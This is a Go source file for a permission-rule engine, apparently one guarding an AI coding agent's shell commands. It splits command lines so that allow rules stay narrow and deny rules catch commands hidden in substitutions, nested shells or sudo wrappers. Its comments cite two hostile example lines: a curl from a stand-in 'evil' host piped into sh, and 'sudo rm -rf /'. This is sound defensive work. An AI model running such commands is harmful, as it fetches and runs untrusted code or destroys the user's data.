package policy

import (
	"strings"
)

// Shell-aware `command:` matching, for managed and preset rules.
//
// A hand-written rule's command globs see the whole command line, so
// `allow: npm test*` also allows `npm test && curl evil | sh`. Rules made
// from the inbox are one tap away, so they get safer semantics:
//
//   - allow: every simple command of the line must match one of the
//     globs, or be harmless (cd into a directory inside the repo; echo,
//     printf, true, pwd; tail/head/grep/wc/sort… reading a pipe), and at
//     least one must match. Lines that expand variables ($X), redirect
//     output to a file, or run substitutions (other than a here-document
//     read with cat, Claude's commit-message form) never match: they are
//     left to the agent's own prompt.
//   - deny and ask: the whole line matches, or any simple command does —
//     also inside $(…), `…`, sh -c '…' and eval, and with sudo, env, time
//     and similar wrappers stripped. So `cd x && sudo rm -rf /` matches
//     `rm -rf /`.
//
// Words are compared with their quotes removed and joined by single
// spaces: `git commit -m "a b"` reads as `git commit -m a b`.

// segment is one simple command.
type segment struct {
	text string // words joined by single spaces
	bare string // the same without assignments and wrappers
	cmd  *shCmd
}

// shellSegs is a command line split for shell-aware rules.
type shellSegs struct {
	top       []segment // the line's own simple commands, in order
	all       []segment // plus those inside substitutions and nested shells
	inertSubs bool      // every substitution is `cat <<'EOF' … EOF`
	vars      bool      // a top-level command expands a parameter
}

const maxSegDepth = 4

func (c *evalCtx) shellSegments() *shellSegs {
	if c.segs == nil {
		c.segs = splitSegments(c.in.Command)
	}
	return c.segs
}

func splitSegments(command string) *shellSegs {
	p := parseShellDocs(command)
	s := &shellSegs{inertSubs: true}
	for i := range p.cmds {
		s.top = append(s.top, makeSegment(&p.cmds[i]))
		s.vars = s.vars || p.cmds[i].vars
	}
	for _, sub := range p.subs {
		if !inertSub(sub) {
			s.inertSubs = false
		}
	}
	s.all = append(s.all, s.top...)
	nestedSegments(p, &s.all, 0)
	return s
}

func makeSegment(c *shCmd) segment {
	argv, _ := UnwrapCommand(c.words)
	return segment{text: strings.Join(c.words, " "), bare: strings.Join(argv, " "), cmd: c}
}

// nestedSegments adds the commands inside substitutions, sh -c scripts,
// shells fed a here-document or here-string, and eval.
func nestedSegments(p shParse, out *[]segment, depth int) {
	if depth >= maxSegDepth {
		return
	}
	var scripts []string
	scripts = append(scripts, p.subs...)
	for i := range p.cmds {
		argv, _ := UnwrapCommand(p.cmds[i].words)
		if len(argv) == 0 {
			continue
		}
		switch prog := cmdBase(argv[0]); {
		case prog == "eval":
			scripts = append(scripts, strings.Join(argv[1:], " "))
		case shells[prog]:
			for j := 1; j < len(argv); j++ {
				w := argv[j]
				if len(w) > 1 && w[0] == '-' && w[1] != '-' && strings.ContainsRune(w[1:], 'c') && j+1 < len(argv) {
					scripts = append(scripts, argv[j+1])
					break
				}
			}
			for _, r := range p.cmds[i].redirs {
				switch r.op {
				case "<<", "<<-":
					scripts = append(scripts, r.body)
				case "<<<":
					scripts = append(scripts, r.target)
				}
			}
		}
	}
	for _, sc := range scripts {
		sp := parseShellDocs(sc)
		for i := range sp.cmds {
			*out = append(*out, makeSegment(&sp.cmds[i]))
		}
		nestedSegments(sp, out, depth+1)
	}
}

// inertSub: a substitution that only prints a quoted here-document.
func inertSub(sub string) bool {
	p := parseShellDocs(sub)
	if len(p.cmds) != 1 || len(p.subs) != 0 {
		return false
	}
	c := p.cmds[0]
	if len(c.words) != 1 || cmdBase(c.words[0]) != "cat" || len(c.redirs) == 0 {
		return false
	}
	for _, r := range c.redirs {
		if r.op != "<<" && r.op != "<<-" {
			return false
		}
	}
	return true
}

func anyGlob(globs []*glob, s string) bool {
	for _, g := range globs {
		if g.match(s) {
			return true
		}
	}
	return false
}

// allowCommand is the allow-rule test described above.
func (c *evalCtx) allowCommand(globs []*glob) bool {
	s := c.shellSegments()
	if len(s.top) == 0 || s.vars || !s.inertSubs {
		return false
	}
	root := c.repo
	if root == "" {
		root = c.cwd
	}
	cwd := c.cwd
	matched := false
	for i := range s.top {
		seg := &s.top[i]
		if writesFile(seg.cmd) {
			return false
		}
		if anyGlob(globs, seg.text) {
			matched = true
			continue
		}
		if !inertCommand(seg.cmd, &cwd, root, c.home) {
			return false
		}
	}
	return matched
}

// strictCommand is the deny/ask test: the whole line or any command.
func (c *evalCtx) strictCommand(fm *fieldMatch) bool {
	if c.matchField(fm) {
		return true
	}
	for _, seg := range c.shellSegments().all {
		if anyGlob(fm.globs, seg.text) || (seg.bare != seg.text && anyGlob(fm.globs, seg.bare)) {
			return true
		}
	}
	return false
}

// writesFile: an output redirection to anything but a file descriptor
// or /dev/null.
func writesFile(c *shCmd) bool {
	for _, r := range c.redirs {
		if !strings.ContainsRune(r.op, '>') {
			continue
		}
		if r.target == "/dev/null" || r.target == "-" || isDigits(r.target) {
			continue
		}
		return true
	}
	return false
}

// pipeFilters read a pipe and print to the terminal; maxArgs is how many
// non-option words (a pattern, a jq filter) they may take.
var pipeFilters = map[string]int{
	"head": 0, "tail": 0, "wc": 0, "sort": 0, "uniq": 0, "cat": 0, "nl": 0, "tac": 0, "cut": 0,
	"grep": 1, "egrep": 1, "fgrep": 1, "rg": 1, "jq": 1, "tr": 2,
}

// inertCommand reports whether a command that matched no glob is harmless
// enough not to spoil an allow: cd into the repo (tracked in cwd), echo,
// or a filter reading the pipe.
func inertCommand(c *shCmd, cwd *string, root, home string) bool {
	w := c.words
	if len(w) == 0 {
		return true
	}
	switch base := cmdBase(w[0]); base {
	case "cd":
		if len(w) != 2 || root == "" {
			return false
		}
		p := absPath(w[1], *cwd, home)
		if p != root && !strings.HasPrefix(p, root+"/") {
			return false
		}
		*cwd = p
		return true
	case "echo", "printf", "true", "false", ":", "pwd":
		return true
	default:
		limit, ok := pipeFilters[base]
		if !ok || !c.pipedIn {
			return false
		}
		n := 0
		for i := 1; i < len(w); i++ {
			a := w[i]
			switch {
			case base == "sort" && (a == "-o" || strings.HasPrefix(a, "--output") || strings.HasPrefix(a, "-o")):
				return false // writes a file
			case base == "cut" && (a == "-d" || a == "-f" || a == "-c" || a == "-b") && i+1 < len(w):
				i++
			case strings.HasPrefix(a, "-") || isDigits(a):
			default:
				n++
			}
		}
		return n <= limit
	}
}
